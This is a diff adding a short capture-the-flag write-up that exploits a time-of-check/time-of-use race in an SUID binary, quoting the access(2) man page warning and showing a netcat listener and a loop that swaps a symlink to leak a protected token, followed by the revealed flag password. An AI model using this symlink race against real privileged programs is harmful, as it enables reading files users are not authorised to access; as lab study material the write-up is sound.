@@ -1,0 +1,27 @@
+An SUID executable and token file are located in home directory.
+
+		./level10 token localhost
+
+	__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...> access("token", 4) = -1 printf("You don't have access to %s\n", "token"You don't have access to token ) = 31 +++ exited (status 31) +++
+
+
+Man page of access warns about security hole.
+
+Warning: Using access() to check if a user is authorized to, for example, open  a file before actually doing so using open(2) creates a security hole
+because the user might exploit the short time interval between checking and opening the file to manipulate it.
+
+An answer talk about TOCTOU race (Time of Check to Time of Update).
+That is a TOCTOU race (Time of Check to Time of Update). A malicious user could substitute a file he has access to for a symlink to something he doesn't have access to between the access() and the open() calls.
+
+Check hack.sh for the script that forces the symbolic link in a while loop.
+		/tmp/hack.sh
+	'runs in background'
+Open new window.
+
+		nc -lk 6969 | grep -v ".( )." &
+
+		while true; do ./level10 /tmp/symlink 127.0.0.1; done &>/dev/null
+
+	woupa2yuojeeaaed06riuj63c
+
+FLAG10 PASSWORD: woupa2yuojeeaaed06riuj63c
